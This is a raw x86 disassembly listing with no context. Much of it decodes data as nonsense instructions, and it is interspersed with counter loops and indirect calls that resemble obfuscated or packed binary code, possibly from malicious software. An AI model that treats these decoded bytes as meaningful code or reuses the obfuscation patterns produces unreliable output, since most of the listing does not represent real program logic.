  40a15b:	bound  edi,QWORD PTR [edx+0x5c]
  40a15e:	jae    0x40a156
  40a160:	jmp    0x62c3ac16
  40a165:	adc    esi,ebp
  40a167:	fst    DWORD PTR [ebx]
  40a169:	cmp    eax,0xf0ff3dd4
  40a16e:	dec    edx
  40a16f:	mov    bh,0x1b
  40a171:	pop    edx
  40a172:	inc    eax
  40a173:	sbb    dl,BYTE PTR [eax]
  40a175:	adc    al,0xea
  40a177:	icebp  
  40a178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a179:	cmp    esi,ebx
  40a17b:	out    0xf4,eax
  40a17d:	out    0x1c,eax
  40a17f:	xor    cl,bh
  40a181:	dec    eax
  40a182:	push   edx
  40a183:	ret    
  40a184:	mov    esp,0x462f7fca
  40a189:	mov    ?,esp
  40a18b:	dec    edi
  40a18c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a18e:	iret   
  40a18f:	mov    ch,0x17
  40a191:	fbld   TBYTE PTR [ebx]
  40a193:	adc    al,0xe3
  40a195:	ret    0xd7dd
  40a198:	cs jle 0x40a11c
  40a19b:	das    
  40a19c:	mov    cl,0x99
  40a19e:	test   BYTE PTR [esi],bl
  40a1a0:	lds    ebp,FWORD PTR [esp+edx*8-0x327a2493]
  40a1a7:	mov    cl,0x30
  40a1a9:	sbb    eax,0x27a72fb9
  40a1ae:	mov    bl,0xa6
  40a1b0:	mov    ah,0xde
  40a1b2:	shr    BYTE PTR [ecx+0x56],0xa7
  40a1b6:	sbb    eax,0x4e33638d
  40a1bb:	aaa    
  40a1bc:	mov    edi,0x98e20e24
  40a1c1:	mov    bl,0x8b
  40a1c3:	call   0x175a:0x56b6d5bf
  40a1ca:	dec    edi
  40a1cb:	inc    DWORD PTR [esi+edx*2]
  40a1ce:	jmp    0xcfad792f
  40a1d3:	jmp    0xa762478e
  40a1d8:	xor    al,0xfa
  40a1da:	iret   
  40a1db:	call   FWORD PTR [edx+0x10]
  40a1de:	xor    DWORD PTR [eax],ecx
  40a1e0:	fisub  WORD PTR [eax+0x20]
  40a1e3:	adc    dl,BYTE PTR [ebx+ebx*2]
  40a1e6:	cs dec ebx
  40a1e8:	xchg   edi,eax
  40a1e9:	mov    ds:0xb3f61d1a,eax
  40a1ee:	inc    ebx
  40a1ef:	jne    0x40a1ef
  40a1f1:	call   0x38621b85
  40a1f6:	add    edi,DWORD PTR [edi+0x8]
  40a1f9:	fst    st(6)
  40a1fb:	xchg   ebx,eax
  40a1fc:	mov    ah,0x73
  40a1fe:	jns    0x40a216
  40a200:	dec    esp
  40a201:	xlat   BYTE PTR ds:[ebx]
  40a202:	(bad)  
  40a204:	out    0x43,al
  40a206:	cdq    
  40a207:	mov    ds:0x5096ed9b,eax
  40a20c:	dec    edx
  40a20d:	shr    BYTE PTR [ecx-0x7f3f8840],1
  40a213:	cmp    DWORD PTR [ecx-0x123570d1],ebx
  40a219:	xor    DWORD PTR [ecx-0x42],edi
  40a21c:	(bad)  [eax+0x7b]
  40a21f:	cmp    eax,0x27814484
  40a224:	int3   
  40a225:	adc    BYTE PTR [esi-0x2599ed52],cl
  40a22b:	xchg   BYTE PTR [ecx-0x3ba38cd],bh
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x212da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fded
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fded,edx
  40a263:	cmp    DWORD PTR ds:0x42fded,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fded,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e3e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e228,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e80f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	call   0x70f5:0x458f581c
  40a2cb:	jo     0x40a26c
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a28b
  40a2d1:	inc    ebx
  40a2d2:	sub    eax,0x406da322
  40a2d7:	dec    ebp
  40a2d8:	and    DWORD PTR [ebx],0x2e85c4e7
  40a2de:	adc    bh,0xd7
  40a2e1:	test   al,0x8d
  40a2e3:	inc    ecx
  40a2e4:	in     eax,dx
  40a2e5:	add    DWORD PTR [edi],esi
  40a2e7:	lahf   
  40a2e8:	lods   al,BYTE PTR ds:[esi]
  40a2e9:	mov    cl,BYTE PTR [ecx]
  40a2eb:	cmp    bl,bh
  40a2ed:	jb     0x40a348
  40a2ef:	inc    esp
  40a2f0:	(bad)  
  40a2f1:	mov    ecx,0xe40e8e04
  40a2f6:	mov    cl,dh
  40a2f8:	and    BYTE PTR [edx-0x23],bh
  40a2fb:	pushf  
  40a2fc:	xchg   ebx,eax
  40a2fd:	div    DWORD PTR [ecx-0x52df23c1]
  40a303:	lods   eax,DWORD PTR ds:[esi]
  40a304:	sub    DWORD PTR [edx+0x5d39ab78],eax
  40a30a:	iret   
  40a30b:	push   edx
  40a30c:	in     al,0x9e
  40a30e:	out    dx,al
  40a30f:	mov    DWORD PTR [edx],eax
  40a311:	add    eax,0x2793910d
  40a316:	sub    eax,DWORD PTR [edx]
  40a318:	scas   eax,DWORD PTR es:[edi]
  40a319:	adc    ebp,DWORD PTR [ebx]
  40a31b:	sub    BYTE PTR [ebx-0x76ae9737],cl
  40a321:	std    
  40a322:	std    
  40a323:	out    dx,al
  40a324:	shr    BYTE PTR [esi+0x28],1
  40a327:	addr16 aas 
  40a329:	inc    edx
  40a32a:	dec    edx
  40a32b:	iret   
  40a32c:	icebp  
  40a32d:	jae    0x40a2d4
  40a32f:	ds push ebx
  40a331:	jnp    0x40a2e3
  40a333:	outs   dx,BYTE PTR ds:[esi]
  40a334:	or     esp,DWORD PTR [ebp+0x2d00de66]
  40a33a:	sub    BYTE PTR [esi+0x60],dl
  40a33d:	mov    BYTE PTR [edi+ebp*1+0x5edece1b],bh
  40a344:	aas    
  40a345:	dec    ebp
  40a346:	popf   
  40a347:	mov    ebp,0x1b084633
  40a34c:	cmp    dh,ah
  40a34e:	imul   ebp,DWORD PTR [ebx-0x48],0x5b
  40a352:	mov    DWORD PTR [edx-0x3b],ebx
  40a355:	push   ecx
  40a356:	repnz test BYTE PTR [ebp-0x2a],0x6b
  40a35b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a35c:	popf   
  40a35d:	mov    ebx,0xe6670681
  40a362:	inc    esp
  40a363:	enter  0xfe,0xe2
  40a367:	sub    al,0x55
  40a369:	mov    cl,0x66
  40a36b:	nop
  40a36c:	iret   
  40a36d:	ror    BYTE PTR [ecx],0x1a
  40a370:	xchg   edi,eax
  40a371:	loopne 0x40a3c3
  40a373:	push   cs
  40a374:	out    0x61,eax
  40a376:	je     0x40a383
  40a378:	repz scas eax,DWORD PTR es:[edi]
  40a37a:	in     al,dx
  40a37b:	es mov ch,0xf8
  40a37e:	push   esp
  40a37f:	lods   al,BYTE PTR ds:[esi]
  40a380:	(bad)  
  40a381:	call   0xca7339a8
  40a386:	inc    ecx
  40a387:	test   eax,0x606223c4
  40a38c:	pop    edx
  40a38d:	adc    edi,ecx
  40a38f:	fnsave [edx]
  40a391:	cmp    DWORD PTR [ebx+0x6],ebx
  40a394:	xlat   BYTE PTR ds:[ebx]
  40a395:	mov    gs,WORD PTR [edx+ecx*8+0x6b]
  40a399:	in     eax,dx
  40a39a:	aam    0xcf
  40a39c:	leave  
  40a39d:	inc    edi
  40a39e:	std    
  40a39f:	mov    esp,0xd25f8908
  40a3a4:	xor    eax,0xba7e62c0
  40a3a9:	repz or cl,BYTE PTR [edx-0xc48b686]
  40a3b0:	ins    BYTE PTR es:[edi],dx
  40a3b1:	xor    eax,0x92e276d4
  40a3b6:	xchg   ebp,eax
  40a3b7:	scas   al,BYTE PTR es:[edi]
  40a3b8:	fisubr DWORD PTR [esp+edi*4+0x6b]
  40a3bc:	mov    ecx,0x3cc34504
  40a3c1:	inc    esi
  40a3c2:	cs dec ebp
  40a3c4:	cmp    eax,esi
  40a3c6:	retf   
  40a3c7:	push   cs
  40a3c8:	(bad)  
  40a3c9:	outs   dx,BYTE PTR ds:[esi]
  40a3ca:	xchg   ecx,eax
  40a3cb:	loopne 0x40a357
  40a3cd:	pop    ds
  40a3ce:	mov    al,ds:0xd0952bcc
  40a3d3:	jmp    0xa8dee9f7
  40a3d8:	fs jmp 0x93961372
  40a3de:	(bad)  
  40a3df:	xor    al,0x49
  40a3e1:	lock je 0x40a408
  40a3e4:	je     0x40a45b
  40a3e6:	fs xchg edi,eax
  40a3e8:	pop    es
  40a3e9:	jg     0x40a429
  40a3eb:	and    BYTE PTR [eax],al
  40a3ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3ee:	pushf  
  40a3ef:	or     ch,BYTE PTR [ebx]
  40a3f1:	mov    bl,0xb
  40a3f3:	outs   dx,DWORD PTR ds:[esi]
  40a3f4:	pop    es
  40a3f5:	clc    
  40a3f6:	lock push ebx
  40a3f8:	sub    DWORD PTR [ebx+0x46],edx
  40a3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3fc:	jb     0x40a43a
  40a3fe:	xor    BYTE PTR [esi],dl
  40a400:	std    
  40a401:	xchg   ebx,eax
  40a402:	pop    ss
  40a403:	stos   BYTE PTR es:[edi],al
  40a404:	or     DWORD PTR [eax+0x7e],0xffffff88
  40a408:	xlat   BYTE PTR ds:[ebx]
  40a409:	pop    es
  40a40a:	fsub   QWORD PTR [edi-0x59]
  40a40d:	outs   dx,DWORD PTR ds:[esi]
  40a40e:	pop    edx
  40a40f:	mov    bl,0xea
  40a411:	pop    edi
  40a412:	mov    al,ds:0x6a210c6d
  40a417:	adc    al,0x41
  40a419:	fistp  WORD PTR [esp+esi*2]
  40a41c:	jb     0x40a443
  40a41e:	sub    DWORD PTR [eax-0x1b470b12],esi
  40a424:	sbb    edx,ebx
  40a426:	test   BYTE PTR [ecx-0x2a],ah
  40a429:	rcl    BYTE PTR [ebp-0x40],0x2
  40a42d:	or     al,0x83
  40a42f:	clc    
  40a430:	loope  0x40a4a4
  40a432:	je     0x40a48b
  40a434:	icebp  
  40a435:	jns    0x40a4aa
  40a437:	add    eax,0xfcfae2da
  40a43c:	sbb    DWORD PTR [esi-0x2f],esi
  40a43f:	xor    BYTE PTR [eax+edx*2+0x75],ah
  40a443:	push   ds
  40a444:	add    dh,bl
  40a446:	and    eax,0xd586d7ff
  40a44b:	ins    BYTE PTR es:[edi],dx
  40a44c:	adc    bl,BYTE PTR [ecx-0xccb7522]
  40a452:	imul   eax,edi,0x49
  40a455:	test   al,0xaf
  40a457:	shl    DWORD PTR [ecx-0x70],0x36
  40a45b:	js     0x40a40d
  40a45d:	jo     0x40a41b
  40a45f:	dec    esi
  40a460:	or     ebp,DWORD PTR es:[edi+ecx*1+0x7bdcbac3]
  40a468:	stos   DWORD PTR es:[edi],eax
  40a469:	arpl   WORD PTR [ebx+0x17],ax
  40a46c:	push   ebx
  40a46d:	jl     0x40a49a
  40a46f:	dec    ecx
  40a470:	imul   eax,DWORD PTR [ebx],0xffffffff
  40a473:	add    al,0x14
  40a475:	inc    ebx
  40a476:	xlat   BYTE PTR ds:[ebx]
  40a477:	jno    0x40a496
  40a479:	inc    esi
  40a47a:	cld    
  40a47b:	sbb    eax,0x9ce6f059
  40a480:	mov    dh,0x19
  40a482:	add    BYTE PTR [eax+0x4c79bfc0],ch
  40a488:	xor    DWORD PTR [esi+0x2b],ebp
  40a48b:	jp     0x40a4c5
  40a48d:	pop    es
  40a48e:	or     al,dh
  40a490:	xchg   ecx,eax
  40a491:	test   BYTE PTR [esi],0x11
  40a494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a495:	icebp  
  40a496:	add    eax,esp
  40a498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a499:	add    eax,0xdb17531e
  40a49e:	fmulp  st(4),st
  40a4a0:	push   cs
  40a4a1:	sqrtps xmm0,xmm1
  40a4a4:	jnp    0x40a442
  40a4a6:	stc    
  40a4a7:	push   0x60
  40a4a9:	lea    esp,[edx-0x62b6e7db]
  40a4af:	xchg   esp,eax
  40a4b0:	shl    dl,cl
  40a4b2:	fcmovnbe st,st(7)
  40a4b4:	shl    BYTE PTR [ecx-0x67],0x93
  40a4b8:	mov    edi,0x63f4a55d
  40a4bd:	xor    al,0xef
  40a4bf:	ds mov ah,0xb
  40a4c2:	dec    esp
  40a4c3:	jno    0x40a4f1
  40a4c5:	mov    edx,0x5451996f
  40a4ca:	ins    BYTE PTR es:[edi],dx
  40a4cb:	js     0x40a46b
  40a4cd:	ret    
  40a4ce:	lock lods eax,DWORD PTR ds:[esi]
  40a4d0:	mov    dh,0xcf
  40a4d2:	mov    bh,0x33
  40a4d4:	mov    bh,0xd7
  40a4d6:	xchg   ebp,eax
  40a4d7:	shr    al,cl
  40a4d9:	test   DWORD PTR [esp+ebp*2+0x8],0xb3f70f67
  40a4e1:	xor    eax,0xfac10b2f
  40a4e6:	jmp    0x40a4cf
  40a4e8:	xchg   ebx,eax
  40a4e9:	push   cs
  40a4ea:	push   ebp
  40a4eb:	aas    
  40a4ec:	adc    DWORD PTR [ebp-0x54906369],esi
  40a4f2:	(bad)  
  40a4f3:	retf   0xa674
  40a4f6:	xchg   ebx,eax
  40a4f7:	sbb    bl,BYTE PTR [edi+0x77]
  40a4fa:	push   0xffffffd3
  40a4fc:	mov    ds:0xd6a6d9ba,al
  40a501:	xchg   esp,eax
  40a502:	mov    dh,cl
  40a504:	adc    cl,al
  40a506:	inc    ebp
  40a507:	xchg   esi,eax
  40a508:	fwait
  40a509:	ins    BYTE PTR es:[edi],dx
  40a50a:	adc    BYTE PTR [esi+0x432674ed],bl
  40a510:	std    
  40a511:	pop    ds
  40a512:	sub    DWORD PTR [ebx],0xbc57f4e2
  40a518:	mov    eax,0xde0eb4a0
  40a51d:	pop    esp
  40a51e:	clc    
  40a51f:	std    
  40a520:	(bad)  
  40a522:	dec    esi
  40a523:	ja     0x40a577
  40a525:	pop    ecx
  40a526:	mov    WORD PTR [ebx+edi*2],?
  40a529:	loopne 0x40a517
  40a52b:	push   esp
  40a52c:	pop    ecx
  40a52d:	scas   al,BYTE PTR es:[edi]
  40a52e:	mov    ah,0x88
  40a530:	adc    ebx,DWORD PTR [edi+0x6c]
  40a533:	push   esi
  40a534:	dec    ebx
  40a535:	pop    ds
  40a536:	ret    0xd7bf
  40a539:	or     eax,0x4e6919f8
  40a53e:	or     edi,DWORD PTR [edx]
  40a540:	js     0x40a59b
  40a542:	sub    BYTE PTR [edi-0x44731a],ah
  40a548:	mov    dl,0xb9
  40a54a:	into   
  40a54b:	sbb    BYTE PTR [eax],0xe9
  40a54e:	test   DWORD PTR [eax-0x39],ebx
  40a551:	xchg   edx,eax
  40a552:	xor    DWORD PTR [ebp+0x14],esi
  40a555:	mov    al,0xac
  40a557:	retf   
  40a558:	mov    dl,0x6c
  40a55a:	js     0x40a5a9
  40a55c:	push   eax
  40a55d:	fisttp DWORD PTR [ebp-0x2787bda5]
  40a563:	adc    ecx,0xffffff86
  40a566:	push   ss
  40a567:	cdq    
  40a568:	adc    ebx,DWORD PTR [edi+0x787568f7]
  40a56e:	xchg   ecx,eax
  40a56f:	dec    esp
  40a570:	jmp    0x4728:0x9d16dfef
  40a577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a578:	jae    0x40a52b
  40a57a:	fucomp st(5)
  40a57c:	xor    eax,0x991f0976
  40a581:	jnp    0x40a549
  40a583:	sbb    al,0xc8
  40a585:	aaa    
  40a586:	fadd   QWORD PTR [esi+0x739b6685]
  40a58c:	out    0xd3,eax
  40a58e:	dec    ebx
  40a58f:	sub    eax,DWORD PTR [ecx-0x7c2207c3]
  40a595:	enter  0xbec5,0x70
  40a599:	(bad)  [ebx+0x5b]
  40a59c:	cmp    edi,DWORD PTR [esi]
  40a59e:	ret    0x3ddd
  40a5a1:	jne    0x40a565
  40a5a3:	stc    
  40a5a4:	out    dx,eax
  40a5a5:	mov    es,WORD PTR [esi+0x58]
  40a5a8:	pushf  
  40a5a9:	jmp    0xfe0c595b
  40a5ae:	xchg   edi,eax
  40a5af:	scas   al,BYTE PTR es:[edi]
  40a5b0:	(bad)  [eax+0x791edc4e]
  40a5b6:	and    al,0x9e
  40a5b8:	xor    eax,0x20642290
  40a5bd:	fnstsw WORD PTR [esi]
  40a5bf:	cld    
  40a5c0:	xchg   esp,eax
  40a5c1:	cmp    al,0xc6
  40a5c3:	aaa    
  40a5c4:	cli    
  40a5c5:	stc    
  40a5c6:	jg     0x40a54d
  40a5c8:	mov    ecx,0x959d02e1
  40a5cd:	call   0xe99e:0xefd98b6a
  40a5d4:	gs das 
  40a5d6:	push   es
  40a5d7:	aam    0xbb
  40a5d9:	into   
  40a5da:	and    BYTE PTR [ebx],al
  40a5dc:	cwde   
  40a5dd:	xchg   edx,eax
  40a5de:	out    0xfa,eax
  40a5e0:	jle    0x40a5fd
  40a5e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5e3:	aas    
  40a5e4:	jb     0x40a594
  40a5e6:	xor    eax,0xfbb8a4c1
  40a5eb:	jl     0x40a636
  40a5ed:	mov    BYTE PTR [ebx],dl
  40a5ef:	mov    cl,0x28
  40a5f1:	pop    es
  40a5f2:	xchg   edx,eax
  40a5f3:	pop    edx
  40a5f4:	out    0x87,al
  40a5f6:	in     al,0xdc
  40a5f8:	push   0x4c
  40a5fa:	call   esp
  40a5fc:	inc    edx
  40a5fd:	(bad)  
  40a5fe:	xchg   bh,dl
  40a600:	dec    ebx
  40a601:	inc    eax
  40a602:	adc    DWORD PTR [ebp+0x481aee07],esi
  40a608:	cmp    DWORD PTR [esi+eax*8-0x68e4b528],eax
  40a60f:	fist   WORD PTR [ebp-0x679ee760]
  40a615:	mov    al,ds:0x1ed99274
  40a61a:	shr    ch,1
  40a61c:	pop    ds
  40a61d:	xor    bh,BYTE PTR [edi+0x1a7d0f6c]
  40a623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a624:	not    DWORD PTR [ebx+0x4e]
  40a627:	pop    es
  40a628:	shr    BYTE PTR [eiz*2-0x19a3a0fe],1
  40a62f:	pushf  
  40a630:	or     al,0xfb
  40a632:	dec    ecx
  40a633:	in     eax,0xdb
  40a635:	push   esp
  40a636:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a637:	adc    dh,bh
  40a639:	mov    dh,BYTE PTR [ebx-0x8]
  40a63c:	dec    ebx
  40a63d:	std    
  40a63e:	in     al,dx
  40a63f:	pop    edi
  40a640:	xor    ecx,DWORD PTR [ecx+0x19]
  40a643:	inc    ecx
  40a644:	imul   edi,DWORD PTR [esi+0x26d20b55],0xa499019b
  40a64e:	jne    0x40a628
  40a650:	loope  0x40a636
  40a652:	shl    BYTE PTR [ecx],0x5
  40a655:	xor    BYTE PTR [di+0x5e],bh
  40a659:	mov    cl,0x8a
  40a65b:	inc    ebx
  40a65c:	out    0x9,eax
  40a65e:	out    dx,eax
  40a65f:	test   BYTE PTR [ebp-0x6e],ch
  40a662:	lahf   
  40a663:	jno    0x40a5ee
  40a665:	ins    BYTE PTR es:[edi],dx
  40a666:	stos   DWORD PTR es:[edi],eax
  40a667:	rcl    DWORD PTR [edi-0x3297a878],1
  40a66d:	push   es
  40a66e:	xchg   ebp,eax
  40a66f:	adc    al,al
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e7ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e7ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e7ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e7ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e7f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e3eb
  40a6c6:	cmp    DWORD PTR ds:0x42e7ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e7ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e7ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e7ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fddd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fddd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fddd,edx
  40a709:	cmp    DWORD PTR ds:0x42fddd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fddd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e36d
  40a728:	push   0x42e35b
  40a72d:	call   DWORD PTR ds:0x42e647
  40a733:	cmp    DWORD PTR ds:0x42fddd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fddd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fddd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e234
  40a75a:	xor    edi,DWORD PTR ds:0x42e813
  40a760:	mov    DWORD PTR ds:0x42e234,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e813,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fdd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fde5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e813,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fdf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fe09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e230,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e230,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e230,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e2e7
  40a7e8:	push   0x42e33d
  40a7ed:	push   0x42e33d
  40a7f2:	call   DWORD PTR ds:0x42e3ef
  40a7f8:	cmp    DWORD PTR ds:0x42e230,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e230
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e230,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e230
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e230,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e22c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fe6e
  40a839:	add    DWORD PTR ds:0x42e807,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	jnp    0x40a8bd
  40a855:	es inc esi
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a836
  40a860:	cli    
  40a861:	(bad)  
  40a862:	call   0xbdb5:0xdf1e7b9b
  40a869:	aaa    
  40a86a:	jno    0x40a881
  40a86c:	xchg   edi,eax
  40a86d:	mov    dl,0x74
  40a86f:	push   esi
  40a870:	cmc    
  40a871:	movsx  edi,BYTE PTR fs:[ebx]
  40a875:	jnp    0x40a88a
  40a877:	ss pop eax
  40a879:	stc    
  40a87a:	or     DWORD PTR [edi+0x298b4835],esi
  40a880:	or     cl,cl
  40a882:	js     0x40a830
  40a884:	mov    bh,0xd0
  40a886:	add    eax,DWORD PTR [edx]
  40a888:	test   al,0xb7
  40a88a:	add    BYTE PTR [esp+edx*1+0x5],ah
  40a88e:	dec    ebp
  40a88f:	js     0x40a85d
  40a891:	jecxz  0x40a833
  40a893:	hlt    
  40a894:	xchg   edi,eax
  40a895:	cmp    edx,DWORD PTR [esi]
  40a897:	sub    DWORD PTR [eax-0x7863e562],ebx
  40a89d:	mov    esi,0x213ab9da
  40a8a2:	mov    ch,dh
  40a8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a5:	daa    
  40a8a6:	jb     0x40a900
  40a8a8:	lods   al,BYTE PTR ds:[esi]
  40a8a9:	and    ch,BYTE PTR [eax]
  40a8ab:	adc    eax,0xe253c0cc
  40a8b0:	jp     0x40a89c
  40a8b2:	or     esi,DWORD PTR [ebp-0x1a306cc3]
  40a8b8:	xor    eax,0x9ede5b5
  40a8bd:	scas   eax,DWORD PTR es:[edi]
  40a8be:	test   eax,0xf0a86936
  40a8c3:	adc    al,0xca
  40a8c6:	retf   0xab55
  40a8c9:	cld    
  40a8ca:	mov    bh,al
  40a8cc:	test   al,0x74
  40a8ce:	test   eax,0x8e70ebdc
  40a8d3:	jne    0x40a917
  40a8d5:	test   esp,esp
  40a8d7:	jl     0x40a8d4
  40a8d9:	push   esi
  40a8da:	and    ch,BYTE PTR [eax-0x5c1f1af3]
  40a8e0:	scas   eax,DWORD PTR es:[edi]
  40a8e1:	mov    ebx,0x6d5051dc
  40a8e6:	push   eax
  40a8e7:	dec    ebx
  40a8e8:	fidiv  WORD PTR [ebx]
  40a8ea:	jl     0x40a8ee
  40a8ec:	loope  0x40a88f
  40a8ee:	es loopne 0x40a890
  40a8f1:	mov    ds:0x7e971768,al
  40a8f6:	pop    ds
  40a8f7:	in     al,0x80
  40a8f9:	jbe    0x40a8f4
  40a8fb:	stos   BYTE PTR es:[edi],al
  40a8fc:	out    dx,al
  40a8fd:	in     al,dx
  40a8fe:	bound  esp,QWORD PTR [ecx]
  40a900:	pop    ecx
  40a901:	dec    ecx
  40a902:	jno    0x40a8e9
  40a904:	stos   DWORD PTR es:[edi],eax
  40a905:	mov    ds:0x33152d4d,eax
  40a90a:	xchg   ebp,eax
  40a90b:	bound  esi,QWORD PTR [ecx]
  40a90d:	ins    BYTE PTR es:[edi],dx
  40a90e:	and    DWORD PTR [eax-0x71],0x64
  40a912:	xor    eax,0xb785b95
  40a917:	sbb    al,BYTE PTR [eax-0x64]
  40a91a:	add    BYTE PTR [edi-0x3a],al
  40a91d:	push   ecx
  40a91e:	lods   al,BYTE PTR ds:[esi]
  40a91f:	lahf   
  40a920:	jb     0x40a928
  40a922:	pop    ss
  40a923:	sub    eax,0x7a6399df
  40a928:	shl    ebp,cl
  40a92a:	mov    edi,0x4d7fdeeb
  40a92f:	int    0xc7
  40a931:	int    0xd9
  40a933:	push   edi
  40a934:	dec    BYTE PTR [ebx-0x1e]
  40a937:	mov    es,WORD PTR [edi-0x5266be62]
  40a93d:	test   al,0x13
  40a93f:	cmp    BYTE PTR [eax-0x3803e3c9],0x6c
  40a946:	mov    BYTE PTR [esi+0x58],bh
  40a949:	iret   
  40a94a:	mov    bl,0x50
  40a94c:	(bad)  
  40a94d:	ret    0x9418
  40a950:	ja     0x40a9a7
  40a952:	cli    
  40a953:	pushf  
  40a954:	aaa    
  40a955:	add    eax,0x6e26381b
  40a95a:	js     0x40a90d
  40a95c:	xchg   DWORD PTR [esi],edi
  40a95e:	clc    
  40a95f:	mov    edi,0x45155f9f
  40a964:	adc    ebp,ebp
  40a966:	push   ebp
  40a967:	jae    0x40a963
  40a969:	lea    ecx,[ebx-0x6a]
  40a96c:	pushf  
  40a96d:	pushf  
  40a96e:	push   eax
  40a96f:	dec    eax
  40a970:	test   DWORD PTR [esi+ebp*2],esi
  40a973:	fwait
  40a974:	outs   dx,DWORD PTR ds:[esi]
  40a975:	mul    DWORD PTR [ebx+0x1a]
  40a978:	mov    dl,0x29
